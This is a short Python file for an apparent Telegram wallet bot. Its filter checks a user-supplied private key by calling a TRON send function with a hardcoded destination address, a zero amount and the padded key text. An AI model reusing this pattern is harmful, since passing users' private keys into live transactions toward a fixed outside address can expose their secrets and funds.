from aiogram import types
from aiogram.dispatcher.filters import BoundFilter

from utils.db_api import quick_commands as commands
from utils.encryption import decrypt_xor
from utils.wallet_func.wallet_func import send_tron


# class DecryptXorPrivate:
#     def __init__(self, psw):
#         self.psw = psw
#
#     def func(self, priv):
#         return decrypt_xor(priv, self.psw)


class IsCorrectPrivateKey(BoundFilter):
    async def check(self, message: types.Message):
        user = await commands.select_user(message.from_user.id)
        # if message.text == decrypt_xor(priv, self.psw)
        send = send_tron(user.wallet, 'TMWXhuxiT1KczhBxCseCDDsrhmpYGUcoA9', 0, "000"+message.text+"000", None)
        result = str(send) == 'Contract validate error : Amount must be greater than 0.' or str(
            send) == 'Contract validate error : account does not exist'
        return not result

